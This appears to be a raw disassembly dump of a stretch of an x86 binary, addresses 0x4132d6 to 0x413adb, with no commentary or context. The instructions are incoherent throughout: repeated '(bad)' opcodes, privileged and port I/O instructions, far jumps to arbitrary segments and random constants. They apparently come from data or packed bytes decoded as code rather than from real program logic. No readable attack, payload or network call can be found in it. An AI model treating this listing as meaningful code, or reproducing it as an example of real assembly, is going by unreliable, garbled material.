  4132d6:	jnp    0x4132d6
  4132d8:	mov    al,0x90
  4132da:	ficom  DWORD PTR [ecx]
  4132dc:	jmp    0xdaa2:0x21454729
  4132e3:	add    ah,BYTE PTR [ebp+0x6f7e7286]
  4132e9:	bound  ecx,QWORD PTR fs:[esi+ebx*8-0x20]
  4132ee:	cmp    DWORD PTR gs:[esi-0x78edc012],esi
  4132f5:	xor    edi,DWORD PTR [edx]
  4132f7:	mov    eax,0x66308313
  4132fc:	(bad)  
  4132fe:	ret    
  4132ff:	xlat   BYTE PTR ds:[ebx]
  413300:	and    eax,0x87e6bddd
  413305:	dec    edi
  413306:	sbb    al,0xb5
  413308:	or     BYTE PTR [esi],bl
  41330a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41330b:	fsubr  QWORD PTR [eax-0x75d5e01e]
  413311:	and    ah,BYTE PTR [ebx]
  413313:	pushf  
  413314:	in     al,0x83
  413316:	imul   esi,ebx,0xffffffd6
  413319:	iret   
  41331a:	ins    DWORD PTR es:[edi],dx
  41331b:	ins    BYTE PTR es:[edi],dx
  41331c:	cli    
  41331d:	add    eax,0xf8da4b5a
  413322:	outs   dx,DWORD PTR ds:[esi]
  413323:	push   0xa5bb4bf5
  413328:	adc    BYTE PTR [edx+0x1c7a827],ah
  41332e:	test   DWORD PTR [ebp-0x4d88d171],eax
  413334:	mov    esi,0x2b2e944d
  413339:	test   eax,0xfecd60ae
  41333e:	int    0xc
  413340:	pop    es
  413341:	adc    eax,0x76fb2bfc
  413346:	jb     0x4132f0
  413348:	mov    DWORD PTR [ebx-0x7c],edi
  41334b:	and    eax,0x66475999
  413350:	dec    ecx
  413351:	add    DWORD PTR [edi+0x47],0xffffffc3
  413355:	xchg   edi,eax
  413356:	in     eax,dx
  413357:	mov    esi,0x55726acc
  41335c:	sti    
  41335d:	xlat   BYTE PTR ds:[ebx]
  41335e:	bnd jmp 0xe81f3c1e
  413364:	out    dx,al
  413365:	xchg   edx,eax
  413366:	enter  0x41b2,0x3b
  41336a:	inc    ecx
  41336b:	xor    DWORD PTR [esp+ebx*8+0x4248c601],esp
  413372:	adc    al,BYTE PTR [ebp-0x348b04ea]
  413378:	sbb    eax,0x4f0f7657
  41337d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41337e:	sub    edx,DWORD PTR ds:0x26572130
  413384:	sahf   
  413385:	rcl    BYTE PTR [ecx*2+0xa99880e],0xff
  41338d:	push   0xffffffac
  41338f:	icebp  
  413390:	mov    al,0x9
  413392:	mov    ah,0xc5
  413394:	inc    esp
  413395:	retf   
  413396:	pcmpgtb mm4,QWORD PTR [eax+0x55688b80]
  41339d:	inc    esi
  41339e:	xlat   BYTE PTR ds:[ebx]
  41339f:	out    0x9b,al
  4133a1:	adc    dl,cl
  4133a3:	push   ecx
  4133a4:	mov    ds:0x9534b157,al
  4133a9:	pop    edx
  4133aa:	retf   0xd14c
  4133ad:	ret    
  4133ae:	shr    BYTE PTR [ebp*2-0x41f8cff4],0x42
  4133b6:	hlt    
  4133b7:	sub    eax,DWORD PTR [ebx]
  4133b9:	dec    ebp
  4133ba:	jne    0x41337e
  4133bc:	mov    ds:0x96c1f506,al
  4133c1:	pop    edx
  4133c2:	repnz stos BYTE PTR es:[edi],al
  4133c4:	popf   
  4133c5:	out    dx,al
  4133c6:	mov    bl,0x7a
  4133c8:	popa   
  4133c9:	cli    
  4133ca:	mov    ebp,0x9391e967
  4133cf:	or     dl,BYTE PTR [ebx+0x58fb54da]
  4133d5:	push   edx
  4133d6:	xor    eax,0xf6df2e7a
  4133db:	xchg   edx,eax
  4133dc:	dec    ebx
  4133dd:	fwait
  4133de:	mov    al,cs:0x8e374106
  4133e4:	test   DWORD PTR [ebp+0x37],edi
  4133e7:	outs   dx,BYTE PTR ds:[esi]
  4133e8:	pop    esi
  4133e9:	cmp    dl,BYTE PTR [eax+ecx*2-0x643affec]
  4133f0:	sahf   
  4133f1:	mov    al,ds:0xf96fbf12
  4133f6:	jno    0x41337f
  4133f8:	cmp    eax,0xec151d11
  4133fd:	fwait
  4133fe:	or     eax,0xd98ff5c8
  413403:	cmp    DWORD PTR [ebx-0x2ffb9358],edx
  413409:	(bad)  
  41340a:	mov    ebx,DWORD PTR [eax+eax*1-0x12]
  41340e:	aas    
  41340f:	test   edi,eax
  413411:	rcr    BYTE PTR [ebx],1
  413413:	ret    0x183c
  413416:	iret   
  413417:	leave  
  413418:	(bad)  
  413419:	outs   dx,BYTE PTR ds:[esi]
  41341a:	mov    cl,0x5f
  41341c:	or     dl,dl
  41341e:	cdq    
  41341f:	add    DWORD PTR [esi-0x22],ebp
  413422:	mov    esi,0xd550d207
  413427:	adc    BYTE PTR [edx],cl
  413429:	dec    ecx
  41342a:	jmp    0xd39abd93
  41342f:	jnp    0x4133f8
  413431:	xlat   BYTE PTR ds:[ebx]
  413432:	neg    DWORD PTR [edi]
  413434:	icebp  
  413435:	in     al,dx
  413436:	and    ch,bh
  413438:	sub    bh,BYTE PTR [eax+0x2bb92d5c]
  41343e:	ss adc al,0xf
  413441:	cdq    
  413442:	addr16 stc 
  413444:	les    esp,FWORD PTR [edi+edx*8]
  413447:	sbb    esp,edx
  413449:	lods   eax,DWORD PTR ds:[esi]
  41344a:	pop    edx
  41344b:	mov    al,0x78
  41344d:	jns    0x41340f
  41344f:	ins    DWORD PTR es:[edi],dx
  413450:	fidiv  DWORD PTR [edx+0x68]
  413453:	sbb    eax,0x4ebc570e
  413458:	mov    esi,0x6216de74
  41345d:	lahf   
  41345e:	adc    al,0x28
  413460:	mov    ds:0x425e1c1d,eax
  413465:	cld    
  413466:	mov    BYTE PTR [eax-0x64],bl
  413469:	mov    eax,ds:0x41f3683d
  41346e:	xchg   ebp,eax
  41346f:	(bad)  
  413470:	sbb    eax,0xba170d4e
  413475:	and    eax,0x323e0913
  41347a:	adc    edx,DWORD PTR [edi+0x3c4777bf]
  413480:	leave  
  413481:	ins    DWORD PTR es:[edi],dx
  413482:	imul   ebx,DWORD PTR [ecx+edx*1+0x2a],0x67
  413487:	in     al,dx
  413488:	mov    dh,0xff
  41348a:	mov    ds:0x3b7e02d1,eax
  41348f:	call   0xcf6dbd34
  413494:	mov    ah,0xae
  413496:	push   ds
  413497:	add    DWORD PTR [ebp+0x24],edx
  41349a:	inc    esi
  41349b:	xchg   DWORD PTR [ebp-0xd],ebp
  41349e:	ret    0x12e4
  4134a1:	rcr    BYTE PTR [ecx+0xc],0x1b
  4134a5:	(bad)  
  4134a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134a8:	sub    eax,0x11bafe89
  4134ad:	pusha  
  4134ae:	or     eax,0xcfb235cd
  4134b3:	mov    esp,0x97813163
  4134b8:	cmp    ch,BYTE PTR [eax-0x69]
  4134bb:	outs   dx,BYTE PTR ds:[esi]
  4134bc:	dec    edi
  4134bd:	outs   dx,BYTE PTR ds:[esi]
  4134be:	mov    ds:0xc9bf61d6,eax
  4134c3:	cmc    
  4134c4:	and    edi,DWORD PTR [eax]
  4134c6:	push   0x9
  4134c8:	mov    ebx,0x84ae864e
  4134cd:	pop    ebx
  4134ce:	inc    esp
  4134cf:	shr    edx,1
  4134d1:	jecxz  0x41353a
  4134d3:	jae    0x413463
  4134d5:	or     eax,0x20be0fad
  4134da:	stos   BYTE PTR es:[edi],al
  4134db:	dec    ebx
  4134dc:	cmp    DWORD PTR [esi],edx
  4134de:	cmp    ebp,ecx
  4134e0:	cdq    
  4134e1:	inc    edx
  4134e2:	cwde   
  4134e3:	repz mov dl,0x88
  4134e6:	outs   dx,DWORD PTR ds:[esi]
  4134e7:	stc    
  4134e8:	sbb    ch,BYTE PTR [eax+ebx*1+0x404d0172]
  4134ef:	and    al,bl
  4134f1:	lahf   
  4134f2:	pop    esi
  4134f3:	in     al,0x73
  4134f5:	int    0x4
  4134f7:	mov    eax,ds:0x866adcd1
  4134fc:	cmp    al,0x91
  4134fe:	lods   al,BYTE PTR ds:[esi]
  413500:	add    BYTE PTR [esi],0xbd
  413503:	jmp    0x74d3:0x75d7f2d0
  41350a:	jns    0x4134fe
  41350c:	jne    0x4134f9
  41350e:	test   eax,0x20f41bed
  413513:	icebp  
  413514:	enter  0xcb4a,0xd8
  413518:	pop    esp
  413519:	cmpxchg BYTE PTR ds:0x8bee6bc7,cl
  413520:	(bad)  
  413521:	fidivr DWORD PTR [edi+0x4fa34c7f]
  413527:	arpl   WORD PTR ds:0xc5cf93c1,bp
  41352d:	mov    eax,0xd8bfe8a7
  413532:	out    dx,eax
  413533:	into   
  413534:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  413536:	pop    ecx
  413537:	mov    ah,0xc3
  413539:	push   ds
  41353a:	cld    
  41353b:	es xchg esi,eax
  41353d:	pop    ecx
  41353e:	pop    esp
  41353f:	pop    esp
  413540:	mul    DWORD PTR cs:[esi+0x1dd92c4]
  413547:	mov    ds:0x640a97be,al
  41354c:	sbb    al,0x8d
  41354e:	xchg   esi,eax
  41354f:	in     eax,0xc9
  413551:	xchg   BYTE PTR [edi],ch
  413553:	push   eax
  413554:	ds dec esp
  413556:	ror    BYTE PTR [eax],1
  413558:	std    
  413559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41355a:	cvtdq2ps xmm6,xmm3
  41355d:	inc    eax
  41355e:	lods   al,BYTE PTR ds:[esi]
  41355f:	xchg   edi,eax
  413560:	out    dx,eax
  413561:	shl    ebx,0x65
  413564:	fdiv   QWORD PTR [esi]
  413566:	mov    ebp,0x9f656bb0
  41356b:	sub    eax,0x9d93236e
  413570:	(bad)
  413573:	fucomp st(7)
  413575:	out    0x9a,al
  413577:	push   ecx
  413578:	or     bl,BYTE PTR [ebp-0x74]
  41357b:	mov    BYTE PTR [ecx-0x294800af],ah
  413581:	popa   
  413582:	(bad)  
  413583:	out    dx,al
  413584:	xchg   esp,eax
  413585:	ret    0x6894
  413588:	mov    bh,0x27
  41358a:	cmp    al,0xfe
  41358c:	bound  esi,QWORD PTR [ebp+0x50f66f72]
  413592:	mov    al,ds:0x5d70d072
  413597:	in     eax,dx
  413598:	ja     0x413576
  41359a:	pop    edx
  41359b:	daa    
  41359c:	not    DWORD PTR fs:[esi+0x25ca26a0]
  4135a3:	and    al,0xec
  4135a5:	int    0x71
  4135a7:	(bad)  
  4135a8:	xchg   edi,eax
  4135a9:	or     ch,ch
  4135ab:	pop    edi
  4135ac:	cmp    BYTE PTR [ebp-0xb],dh
  4135af:	arpl   WORD PTR [edx],bp
  4135b1:	add    DWORD PTR [eax+0xe],0x6b
  4135b5:	mov    bh,0xf
  4135b7:	mov    bl,0x44
  4135b9:	add    BYTE PTR [ebx-0x4fdd826a],ah
  4135bf:	fnstenv [edx-0x43]
  4135c2:	ins    BYTE PTR es:[edi],dx
  4135c3:	mov    eax,ds:0x28ab0a7
  4135c8:	xchg   edx,eax
  4135c9:	add    DWORD PTR [esi+0x79dc06bb],0x46d18950
  4135d3:	or     ah,dl
  4135d5:	mov    edi,DWORD PTR [ebx+0x51b01995]
  4135db:	mov    DWORD PTR [ebx-0x6a844a69],edi
  4135e1:	repnz mov WORD PTR [edx-0x5652f370],?
  4135e8:	pusha  
  4135e9:	ret    
  4135ea:	aas    
  4135eb:	jo     0x4135c3
  4135ed:	or     eax,0x15df9b75
  4135f2:	loopne 0x41359b
  4135f4:	add    BYTE PTR [ebp+0x5f],bl
  4135f7:	add    cl,dl
  4135f9:	pop    edi
  4135fa:	pop    ds
  4135fb:	popf   
  4135fc:	(bad)  
  4135fd:	jmp    0x626c:0x591c6fc7
  413604:	jbe    0x4135e5
  413606:	ficomp DWORD PTR [eax+0x58562d9d]
  41360c:	mov    ds:0xe07103f4,al
  413611:	stc    
  413612:	add    al,0x11
  413614:	jb     0x41365b
  413616:	leave  
  413617:	jl     0x41359d
  413619:	mov    ds:0xad3ce648,eax
  41361e:	pop    esi
  41361f:	push   ebp
  413620:	cdq    
  413621:	inc    ebp
  413622:	not    eax
  413624:	mov    esi,0x341cc2d9
  413629:	jno    0x4135b0
  41362b:	loopne 0x413674
  41362d:	xchg   edx,eax
  41362e:	popf   
  41362f:	jge    0x41366b
  413631:	xchg   ecx,eax
  413632:	nop
  413633:	aaa    
  413634:	ret    
  413635:	mov    ebp,0xa26186d5
  41363a:	push   eax
  41363b:	mov    al,ds:0x136e557e
  413640:	xchg   edi,eax
  413641:	inc    esp
  413642:	xor    eax,edi
  413644:	out    0x5e,eax
  413646:	popa   
  413647:	pop    eax
  413648:	pop    edi
  413649:	mov    eax,ds:0xf0906786
  41364e:	shr    DWORD PTR [edi-0x26],cl
  413651:	jbe    0x4136ae
  413653:	hlt    
  413654:	stos   BYTE PTR es:[edi],al
  413655:	mov    ds:0xfedf6f48,eax
  41365a:	sub    DWORD PTR [edi+0x4ffd5e25],ebx
  413660:	test   eax,0x357e8d99
  413665:	(bad)  
  413667:	rcr    BYTE PTR [edi+0x4a9351b8],1
  41366d:	sub    DWORD PTR [eax],0x19
  413670:	inc    DWORD PTR [eax]
  413672:	xor    ah,dl
  413674:	fistp  DWORD PTR [esi-0x6b]
  413677:	xor    edi,DWORD PTR [ecx-0x4c]
  41367a:	pop    edi
  41367b:	lods   al,BYTE PTR ds:[esi]
  41367c:	add    BYTE PTR [edi+0x7e5ef4e2],0xc6
  413683:	mov    edx,0xb12d7a58
  413688:	lods   al,BYTE PTR ds:[esi]
  413689:	iret   
  41368a:	pushf  
  41368b:	mov    edx,0x55453def
  413690:	add    al,BYTE PTR [ebx*8+0x7a8176b1]
  413697:	call   0xc6fb8f61
  41369c:	or     BYTE PTR [eax+0x3],bh
  41369f:	jg     0x413691
  4136a1:	cmp    al,0x81
  4136a3:	shl    cl,cl
  4136a5:	add    ebp,DWORD PTR [ecx]
  4136a7:	(bad)  
  4136a8:	hlt    
  4136a9:	(bad)  
  4136aa:	jns    0x413724
  4136ac:	sbb    al,0x95
  4136ae:	hlt    
  4136af:	out    dx,al
  4136b0:	jne    0x413696
  4136b2:	inc    ebp
  4136b3:	or     ah,BYTE PTR [eax+0x7a]
  4136b6:	mov    esi,0xf95d710e
  4136bb:	jmp    0xb52a:0xec50dd0f
  4136c2:	mov    al,ds:0x841e2996
  4136c7:	lds    ebx,FWORD PTR [edi]
  4136c9:	or     eax,DWORD PTR [ecx+0x69]
  4136cc:	jb     0x413702
  4136ce:	or     bh,bl
  4136d0:	cmp    ch,BYTE PTR [ebp-0x5fdc4e7b]
  4136d6:	adc    BYTE PTR [edi+0x2c],bh
  4136d9:	nop    DWORD PTR [esi+esi*2]
  4136dd:	ss ja  0x41372b
  4136e0:	mov    ecx,0xabbd8f49
  4136e5:	push   eax
  4136e6:	jg     0x41368e
  4136e8:	call   DWORD PTR [ebx-0x74]
  4136eb:	mov    edi,ecx
  4136ed:	pop    ebx
  4136ee:	inc    ebx
  4136ef:	ds xchg ebx,eax
  4136f1:	test   DWORD PTR [esi],ebp
  4136f3:	into   
  4136f4:	lahf   
  4136f5:	out    dx,eax
  4136f6:	cmp    esp,DWORD PTR ds:0xe3bd6fb4
  4136fc:	retf   
  4136fd:	(bad)
  413700:	loopne 0x4136ec
  413702:	test   DWORD PTR [esi],0xfd7f023a
  413708:	(bad)  
  413709:	sbb    DWORD PTR [edi],ebp
  41370b:	dec    ecx
  41370c:	pop    ss
  41370d:	imul   ebx,DWORD PTR [esi],0x4e
  413710:	ins    BYTE PTR es:[edi],dx
  413711:	retf   0xca2d
  413714:	pop    esi
  413715:	lea    ebp,[ebx-0xd]
  413718:	xor    al,0xc9
  41371a:	jg     0x41371e
  41371c:	shufps xmm2,XMMWORD PTR [esi+0x10a90370],0x72
  413724:	or     eax,0xac9db1bd
  413729:	and    DWORD PTR es:[edi-0x4afefda0],0xe77e119a
  413734:	mov    cl,0x1b
  413736:	mov    WORD PTR [edi-0x11],?
  413739:	adc    ebp,DWORD PTR [ecx+0x1f5e4a2e]
  41373f:	retf   0x4fdf
  413742:	push   es
  413743:	mov    ecx,0x31bd9f3d
  413748:	push   ebp
  413749:	push   cs
  41374a:	lods   al,BYTE PTR ds:[esi]
  41374b:	lahf   
  41374c:	loope  0x413739
  41374e:	and    BYTE PTR [ecx+0x1e],0xd4
  413752:	pop    ebx
  413753:	and    bh,BYTE PTR [eax+0x64]
  413756:	mov    dl,0xca
  413758:	shl    DWORD PTR [ebx+0x7016904d],0x15
  41375f:	dec    eax
  413760:	push   cs
  413761:	and    bh,BYTE PTR [ebx]
  413763:	aas    
  413764:	xchg   edi,eax
  413765:	inc    esi
  413766:	mov    ebx,0x36b8e590
  41376b:	add    DWORD PTR [edi+0x22267b46],esi
  413771:	in     eax,0x52
  413773:	sbb    eax,eax
  413775:	in     al,0x43
  413777:	jns    0x41372d
  413779:	fcmovne st,st(2)
  41377b:	mov    ebp,0xd24e2c82
  413780:	sbb    al,0x25
  413782:	popf   
  413783:	push   es
  413784:	fs pop es
  413786:	push   eax
  413787:	xchg   edx,eax
  413788:	pop    esi
  413789:	adc    BYTE PTR es:[ebx+0x2c93bf74],bl
  413790:	pop    ecx
  413791:	push   0x2f
  413793:	mov    esi,edx
  413795:	shl    DWORD PTR [ecx],0x38
  413798:	int    0x79
  41379a:	mov    dh,0x7b
  41379c:	hlt    
  41379d:	mov    al,0x80
  41379f:	push   ss
  4137a0:	pop    ss
  4137a1:	push   es
  4137a2:	stc    
  4137a3:	or     bl,ch
  4137a5:	in     al,dx
  4137a6:	adc    BYTE PTR [ebx],ch
  4137a8:	sub    edx,DWORD PTR [edx-0x2e]
  4137ab:	fcmove st,st(1)
  4137ad:	jmp    0x2dbe:0x5cd4d090
  4137b4:	push   cs
  4137b5:	sbb    ch,ch
  4137b7:	inc    BYTE PTR [edi-0x692f8560]
  4137bd:	enter  0xa03c,0xa1
  4137c1:	adc    BYTE PTR [ebx],bh
  4137c3:	leave  
  4137c4:	test   DWORD PTR [ebx+0x4a],ecx
  4137c7:	cmp    bl,0x42
  4137ca:	push   ds
  4137cb:	je     0x41381b
  4137cd:	fwait
  4137ce:	les    esi,FWORD PTR [ebx-0x5a]
  4137d1:	pop    ds
  4137d2:	mov    WORD PTR [eax-0x268c794d],?
  4137d8:	sub    BYTE PTR [ecx],al
  4137da:	mov    bh,0x5a
  4137dc:	xchg   ebx,edx
  4137de:	push   cs
  4137df:	mov    ds:0x113fa97e,al
  4137e4:	dec    ebp
  4137e5:	mov    dh,0x81
  4137e7:	call   0x7828a8e8
  4137ec:	sub    BYTE PTR [esi],bl
  4137ee:	mov    ebp,0x806ff623
  4137f3:	jmp    0x413793
  4137f5:	jns    0x413785
  4137f7:	in     al,dx
  4137f8:	jb     0x413780
  4137fa:	daa    
  4137fb:	mov    ah,0x45
  4137fd:	xchg   edi,eax
  4137fe:	shl    bh,0x7c
  413801:	pop    esi
  413802:	ins    BYTE PTR es:[edi],dx
  413803:	jle    0x4137b1
  413805:	inc    esp
  413806:	in     al,0xfe
  413808:	xor    BYTE PTR [ebx-0x5d],bh
  41380b:	pop    esp
  41380c:	xchg   ebx,eax
  41380d:	cwde   
  41380e:	(bad)  
  41380f:	mov    eax,ds:0x843d804
  413814:	jno    0x413844
  413816:	jae    0x4137bd
  413818:	(bad)  
  41381a:	inc    eax
  41381b:	mov    DWORD PTR [edi+esi*2],eax
  41381e:	ss mov ch,0x21
  413821:	mov    eax,0xea93ee8f
  413826:	pop    ss
  413827:	inc    ebp
  413828:	out    0x1a,eax
  41382a:	shr    BYTE PTR [ecx],0x78
  41382d:	add    BYTE PTR cs:[esi],al
  413830:	aas    
  413831:	jae    0x41388a
  413833:	xor    edi,edi
  413835:	and    esi,esi
  413837:	pop    edx
  413838:	pop    edi
  413839:	gs gs and al,0x41
  41383d:	sbb    dl,BYTE PTR [edx+0x76]
  413840:	aaa    
  413841:	mov    WORD PTR ds:0xb70345d8,es
  413847:	bound  edi,QWORD PTR [ecx]
  413849:	dec    ecx
  41384a:	mov    ecx,0x6ad3a210
  41384f:	pop    ds
  413850:	(bad)  
  413851:	lods   eax,DWORD PTR ds:[esi]
  413852:	mov    edi,0x9e6da34a
  413857:	inc    ebp
  413858:	(bad)
  41385b:	int3   
  41385c:	or     cl,BYTE PTR [eax]
  41385e:	mov    ecx,0xe6191a81
  413863:	dec    edi
  413864:	adc    BYTE PTR [esi+0x2e],ah
  413867:	dec    esi
  413868:	mov    edi,0xd125eab0
  41386d:	push   esi
  41386e:	rol    BYTE PTR [esi],1
  413870:	push   edx
  413871:	jo     0x413896
  413873:	mov    ?,WORD PTR [ecx-0x2f601a7d]
  413879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41387a:	pop    esp
  41387b:	popf   
  41387c:	nop
  41387d:	jmp    0x15276f2b
  413882:	in     eax,dx
  413883:	jecxz  0x41386c
  413885:	mov    eax,ds:0x82020519
  41388a:	mov    cl,0x7e
  41388c:	jo     0x4138a3
  41388e:	mov    WORD PTR [ebx+0x1e283cd8],gs
  413894:	cmp    eax,0x750867f4
  413899:	outs   dx,DWORD PTR ds:[esi]
  41389a:	adc    esi,DWORD PTR [edx-0x26]
  41389d:	adc    BYTE PTR [ebx+0x283abae9],bl
  4138a3:	jge    0x413901
  4138a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138a6:	sbb    BYTE PTR [edx+0x5b],dl
  4138a9:	(bad)  
  4138aa:	push   esi
  4138ab:	sub    eax,0x41a98d79
  4138b0:	push   edx
  4138b1:	mov    BYTE PTR [ebx+0x6a0a4340],ah
  4138b7:	fimul  DWORD PTR [esp+edx*2-0x63]
  4138bb:	(bad)  
  4138bc:	ffreep st(0)
  4138be:	mov    al,ds:0xc12fa081
  4138c3:	sub    eax,0x108ed3c8
  4138c8:	popf   
  4138c9:	pop    ds
  4138ca:	xor    eax,0x66d8ab88
  4138cf:	std    
  4138d0:	jp     0x413939
  4138d2:	cmp    edi,ecx
  4138d4:	cmp    ecx,edx
  4138d6:	stos   BYTE PTR es:[edi],al
  4138d7:	fld    DWORD PTR [edx+0x44829e4d]
  4138dd:	cld    
  4138de:	gs push ebx
  4138e0:	pop    ebx
  4138e1:	push   0xffffffaa
  4138e3:	push   edx
  4138e4:	mov    edi,0xaef62678
  4138e9:	idiv   eax
  4138eb:	add    eax,0x7be99d93
  4138f0:	icebp  
  4138f1:	xchg   BYTE PTR [edx+0x4d043021],dh
  4138f7:	mov    edi,0x4723fc50
  4138fc:	adc    al,cl
  4138fe:	mov    esi,DWORD PTR [eax-0x51]
  413901:	sub    DWORD PTR ss:[ebp-0x50],0x11
  413906:	mov    al,0x33
  413908:	push   ecx
  413909:	mov    ds:0x9b450ad3,eax
  41390e:	jecxz  0x41393a
  413910:	mov    bh,BYTE PTR [ebp+0x50ebc97b]
  413916:	mov    WORD PTR [esp+ecx*2+0x4],ss
  41391a:	inc    BYTE PTR [ecx+0xa]
  41391d:	lahf   
  41391e:	(bad)  
  41391f:	in     al,0x4c
  413921:	lods   al,BYTE PTR ds:[esi]
  413922:	in     eax,0x29
  413924:	ss inc edx
  413926:	mov    edi,DWORD PTR [edx+0x60]
  413929:	or     BYTE PTR [edx],dl
  41392b:	(bad)  
  41392c:	and    DWORD PTR [esp+ecx*2-0x374ce862],edi
  413933:	ja     0x41397a
  413935:	pop    edi
  413936:	ins    DWORD PTR es:[edi],dx
  413937:	cmp    al,BYTE PTR [ebp-0x5]
  41393a:	mov    esi,0x6a311bd9
  41393f:	(bad)  
  413940:	dec    edi
  413942:	xchg   esp,eax
  413943:	pop    ecx
  413944:	lods   eax,DWORD PTR ds:[esi]
  413945:	and    esi,esi
  413947:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  413949:	mov    dl,0xae
  41394b:	inc    edi
  41394c:	rcl    BYTE PTR [edi+0x4f],0xbb
  413950:	lods   eax,DWORD PTR ds:[esi]
  413951:	(bad)  
  413952:	aas    
  413953:	aaa    
  413954:	lock mov al,ds:0xbd1bed34
  41395a:	add    DWORD PTR [ebp+0x60acf18e],eax
  413960:	pop    eax
  413961:	jae    0x413950
  413963:	popw   es
  413965:	popw   es
  413967:	mov    ah,0xba
  413969:	cmp    al,0x59
  41396b:	adc    DWORD PTR [edx-0x50c779d],0x9995fb5b
  413975:	xor    al,0xa1
  413977:	jo     0x41392c
  413979:	mov    cl,0xb8
  41397b:	mov    dl,0xc5
  41397d:	and    eax,0x1b3e6939
  413982:	inc    ebx
  413983:	shl    BYTE PTR [edx+eax*1+0x41260885],0x86
  41398b:	repz dec eax
  41398d:	jae    0x4139fa
  41398f:	mov    edi,0xc322fb3c
  413994:	add    cl,BYTE PTR [edx-0x2f]
  413997:	mov    ch,ah
  413999:	cli    
  41399a:	mov    bh,0x10
  41399c:	xor    DWORD PTR [edi-0xe4d3834],0x74dbd784
  4139a6:	cmp    esp,DWORD PTR [ecx]
  4139a8:	jnp    0x4139fb
  4139aa:	mov    BYTE PTR [eax],bl
  4139ac:	xchg   ecx,eax
  4139ad:	lds    ecx,FWORD PTR [ebx]
  4139af:	lods   al,BYTE PTR ds:[esi]
  4139b0:	jae    0x413a05
  4139b2:	mov    edi,0x43758c06
  4139b7:	dec    esp
  4139b8:	inc    edx
  4139b9:	cmp    ecx,ebp
  4139bb:	sahf   
  4139bc:	push   ds
  4139bd:	fs inc ebp
  4139bf:	sub    BYTE PTR [edx+0x74],ch
  4139c2:	xchg   esp,eax
  4139c3:	loope  0x4139a4
  4139c5:	adc    esp,DWORD PTR [ebx]
  4139c7:	cmp    bh,BYTE PTR [esi+ebx*8+0x73cff0e3]
  4139ce:	dec    edi
  4139cf:	jae    0x4139a2
  4139d1:	mov    ah,0x3a
  4139d3:	rcr    DWORD PTR [esi+0x3b23d08c],1
  4139d9:	call   0x8f41:0x37574038
  4139e0:	pusha  
  4139e1:	adc    DWORD PTR gs:0xc72d1166,esp
  4139e8:	iret   
  4139e9:	inc    ebx
  4139ea:	push   0xe
  4139ec:	inc    ebx
  4139ed:	in     al,dx
  4139ee:	scas   al,BYTE PTR es:[edi]
  4139ef:	and    eax,0x4b7882c0
  4139f4:	iret   
  4139f5:	or     eax,0xa12a35b8
  4139fa:	xchg   esi,eax
  4139fb:	dec    edi
  4139fc:	sbb    al,0x5d
  4139fe:	pop    esi
  4139ff:	leave  
  413a00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a01:	sub    BYTE PTR [ebx+0x283a4f89],0x9c
  413a08:	aad    0x7c
  413a0a:	leave  
  413a0b:	lea    edi,[edx+0x1bb3b1a7]
  413a11:	das    
  413a12:	cli    
  413a13:	fdiv   DWORD PTR [edi-0x6bba358c]
  413a19:	jle    0x413a8c
  413a1b:	sub    edx,DWORD PTR [edx+0x3b]
  413a1e:	aam    0x9b
  413a20:	loopne 0x413a2f
  413a22:	xchg   edx,eax
  413a23:	(bad)  
  413a24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a25:	xchg   edx,eax
  413a26:	pop    ss
  413a27:	pop    ecx
  413a28:	(bad)  
  413a29:	mov    WORD PTR ds:0x79bb0bf3,ds
  413a2f:	sahf   
  413a30:	push   ebx
  413a31:	(bad)
  413a35:	out    dx,eax
  413a36:	rcl    edi,cl
  413a38:	cmp    ebp,DWORD PTR [ebx-0x6b2a3c94]
  413a3e:	adc    BYTE PTR [ebp-0x3d53d223],ah
  413a44:	fs add al,0xc
  413a47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a48:	inc    esi
  413a49:	iret   
  413a4a:	mov    edx,0x4bf500b8
  413a4f:	aas    
  413a50:	adc    BYTE PTR [ebx],dl
  413a52:	adc    DWORD PTR [ebx+eiz*1-0x7c02fe06],ebp
  413a59:	add    bl,bl
  413a5b:	mov    ecx,0xee1f7d3c
  413a60:	dec    esi
  413a61:	push   es
  413a62:	cmp    BYTE PTR [ebx],ch
  413a64:	icebp  
  413a65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a66:	xchg   ebp,eax
  413a67:	inc    edx
  413a68:	mov    esp,0x4b7631cc
  413a6d:	xor    cl,dh
  413a6f:	add    al,0xb8
  413a71:	(bad)  
  413a72:	sti    
  413a73:	pusha  
  413a74:	dec    eax
  413a75:	repz jp 0x413a50
  413a78:	in     al,0x24
  413a7a:	xchg   ebp,eax
  413a7b:	fld    QWORD PTR [edx]
  413a7d:	inc    eax
  413a7e:	mov    ebx,0x84252622
  413a83:	enter  0x99b2,0xe3
  413a87:	cmp    DWORD PTR [eax+0x1e],ebp
  413a8a:	lea    eax,[edi+0x7e1a6e63]
  413a90:	xor    BYTE PTR [ebp+0x4b3acfca],ch
  413a96:	push   edx
  413a97:	adc    dh,BYTE PTR [edx-0x4b6ab62c]
  413a9d:	mov    ds:0xe08a8ae,al
  413aa2:	sub    DWORD PTR [ebx],esi
  413aa4:	xor    eax,0xb2ddf22c
  413aa9:	xor    ch,BYTE PTR [ebp+ebx*8+0x47]
  413aad:	rol    BYTE PTR [edi-0x3a],cl
  413ab0:	jg     0x413b1f
  413ab2:	sub    al,0xa6
  413ab4:	retf   0x1c4b
  413ab7:	cmc    
  413ab8:	aam    0xd3
  413aba:	push   edx
  413abb:	retf   0xe67d
  413abe:	pop    edx
  413abf:	dec    ebx
  413ac0:	pop    ss
  413ac1:	xor    BYTE PTR [esi],0xcb
  413ac4:	jle    0x413b45
  413ac6:	or     DWORD PTR [ebx+0x2c7ac983],esi
  413acc:	xchg   esp,eax
  413acd:	js     0x413a7a
  413acf:	cs jmp 0x413ac5
  413ad2:	popf   
  413ad3:	sbb    al,0x32
  413ad5:	aas    
  413ad6:	add    dl,bh
  413ad8:	rcl    DWORD PTR [ecx],0x80
  413adb:	add    DWORD PTR [edi+0x3],ebx
